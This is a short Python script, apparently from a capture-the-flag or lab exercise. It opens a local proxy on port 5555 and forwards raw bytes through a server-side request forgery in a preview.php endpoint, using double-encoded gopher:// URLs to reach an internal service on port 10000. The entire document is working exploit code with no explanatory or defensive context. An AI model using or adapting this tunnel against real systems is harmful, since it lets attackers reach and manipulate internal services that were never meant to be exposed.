import socket, requests, urllib.parse

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(('127.0.0.1', 5555))
server.listen(5)
print("[*] Proxy running on 127.0.0.1:5555")

while True:
    conn, _ = server.accept()
    data = conn.recv(65536)
    double_encoded = urllib.parse.quote(urllib.parse.quote(data))
    url = f"http://10.49.129.21/preview.php?url=gopher://127.0.0.1:10000/_{double_encoded}"
    resp = requests.get(url)
    conn.sendall(resp.content)
    conn.close()